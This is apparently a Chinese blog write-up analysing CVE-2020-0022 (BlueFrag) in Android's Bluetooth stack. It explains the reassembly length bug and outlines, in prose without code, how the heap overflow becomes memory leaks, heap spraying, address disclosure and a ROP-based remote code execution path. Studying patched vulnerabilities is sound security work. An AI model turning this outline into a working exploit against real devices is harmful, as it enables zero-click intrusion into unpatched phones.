前言

Google 官方在 2020 年 2 月的 Android 安全公告中修复了一个蓝牙协议栈的严重漏洞，编号 CVE-2020-0022。在 Android 8.0、8.1、9 中可以 Zero-Click RCE，Android 10 能造成 DOS 的效果。

2020 年 4 月 22 日，网上公开了《CVE-2020-0022 an Android 8.0-9.0 Bluetooth Zero-Click RCE – BlueFrag》，详细介绍了该漏洞的发现过程、成因及利用。

本文在学习的基础上，对该漏洞的原理及利用过程做个记录总结。

准备工作

使用 Google Nexus 6P 作为实验设备，刷入了最新的官方 ROM：

在 bt/hci/src/hci_layer_linux.cc 中 HCI 收到数据包时， 为之申请内存并加上 BT_HDR 头部，根据 type 判断如果是 ACL 数据包 ，直接交由 bt/hci/src/hci_layer.cc 的 acl_event_received() 函数处理（此时的数据包已经剥离了 1 bytes 的 HCI Packet Type）。

调用 bt/hci/src/packet_fragmenter.cc 的 reassemble_and_dispatch() 函数。

行 127 到 134，从数据包中依次取出 handle、acl length、l2cap length，从 handle 提取出 2 bits 的 PB Flag 和 12 bits 的 Connection Handle（连接句柄）。partial_packets 是一个 map 结构，用于存储不同连接的数据包指针。行 136 到 147，如果是controller 到 host 的首包（PB flag 为 2），判断之前是否已经接收过该连接的包，如果有则丢弃老的包。行 149 到 154，ACL 数据包载荷最小应为 4 个字节，包括 L2CAP length 及 CID 各 2 字节。

行 156 到 168，计算原完整 L2CAP 数据包的长度，判断该长度是否溢出，并且 L2CAP 的载荷要小于 4096 字节，这表明 HCI 层只能重组 L2CAP length <= 4096 的 L2CAP 包，否则需要依靠 L2CAP 自身的分段机制。行 170 到 178，判断是否还有后续的数据包分段，如果没有则直接返回。

如果还有后续的包，就需要进行包重组。行 180 到 186，分配 partial_packet 结构用于重组数据包，分别设置 partial_packet->event、partial_packet->len、partial_packet->offset 的值。 partial_packet->len 为原完整 L2CAP 包的长度，partial_packet->offset 指向当前的分段偏移，重组后的包位于 partial_packet-> data。紧接着调用 memcpy 将首包拷贝到 partial_packet-> data 中。

行 189 到 196，跳过 handle 并调整 Data Total Length 的值，将 partial_packet 地址放入 partial_packets 中，释放当前分段包。

上面是对于首包的处理逻辑，下面看看续包。行 198 到 205，如果在 partial_packets 中找不到该连接的前序包，释放该无效包并直接返回，要是找到了，就需要将续包和前序包进行重组。

行 206 到 219，从 partial_packets 中找到前序包 partial_packet。packet->len - HCI_ACL_PREAMBLE_SIZE 为 ACL 续包载荷的长度（L2CAP 数据包分片），partial_packet->offset 为已经接收的前序包的偏移，将二者之和 projected_offset 与预期 L2CAP 总长度 partial_packet->len 比较，如果大于预期长度，需要对当前续包进行裁剪，调整 packet->len，避免拷贝后 partial_packet 越界。

这里将 partial_packet 的剩余可用长度直接作为 packet->len，少算了 HCI_ACL_PREAMBLE_SIZE。在行 221 调用 memcpy 的时候， 拷贝长度是 packet->len - packet->offset。

因此，如果进入了上面的 if 逻辑，重组后的包会漏掉最后的 4 字节。特殊的，如果调整后的 packet->len < HCI_ACL_PREAMBLE_SIZE（4 字节），会整数下溢导致拷贝长度变成一个很大的数，触发堆溢出。

利用

理解了上述漏洞原理，很容易构造出 PoC，将一个 L2CAP 包拆分成多个 ACL 数据包发送并满足漏洞触发条件即可。

在实际测试中， 该漏洞在 android 8.0、8.1、9 等版本不会直接 crash。这得益于 aarch64 架构 memcpy 的实现，为了提高效率，不是简单的单字节拷贝。如下所示，memcpy 根据拷贝长度的不同有三种处理逻辑：

假设 count == -2，拷贝逻辑就很有意思了：

  1. srcend 和 dstend 分别指向 src、dst 的倒数第 3 个字节。
  2. count > 96，进入 copy_long。
  3. count = count + tmp1，count -> [-2: 12]，大概率是一个正数。
  4. 从 src 拷贝 16 字节到 dst，并对齐 dst 到 16 字节。
  5. count < 128 + 16，从 srcend - 64 拷贝 64 字节到 dstend - 64，从 src + 16 拷贝 64 字节到 dst + 16。

由此堆溢出可以转为内存读写，有以下几点：

  1. 重组包和续包的大小都是可控的， slab 分配器分配相同大小的对象是内存相邻的。
  2. 如果 L2CAP Echo Request 前序包的 len(Data) >= 66 字节，就不会覆盖到重组包的任何头部结构。这是最简单的一种泄漏方式，每次可以泄漏 64 - 16（续包头部）= 48 bytes 的内存。
  3. 如果 len(Data) < 66 字节，会用续包之前的内存破坏重组包的头部， 可能收不到 Echo 的返回包。可以考虑堆喷相同大小的续包，使得续包之前的内存可控，这样能可靠的修改重组包的头部，通过 Echo Response 进行高级内存泄漏。
  4. 重组包后面的内存可能是空闲的，也可能分配了对象，但是不包含指针等，因此不能稳定 crash。

可用 crash 现场：

  • 00 pc 00000000000ca258 /system/lib64/libchrome.so (base::WaitableEvent::Signal()+204)， X0 可控，PC 可控。

接下来只要能泄漏 lib 库的地址，以及一块已知地址的可写内存，就可以 rce。采用上面说的高级内存泄漏的方式，堆喷和续包同样大小的包。

触发漏洞，可控的修改重组包的头部，泄漏的堆内存位于 Echo Response 中，从泄漏内存中找可用的指针，进而推测 –> lib 库基地址。
在泄漏的过程中蓝牙进程可能会奔溃重启，幸运的是 lib 库的地址每次系统重启才会改变。

通过控制续包所在的内存，泄漏 partial_packets，进而获得重组包的地址 –> 可控内存。

原作者用的三星，可以泄漏 libicuuc.so 的地址，这个库里里面有 dlopen 和 dlsym，可以构造 rop 解析 system 的符号。在 nexus 6p 测试，只能稳定泄漏 libandroid_runtime.so、libutils.so 的地址。
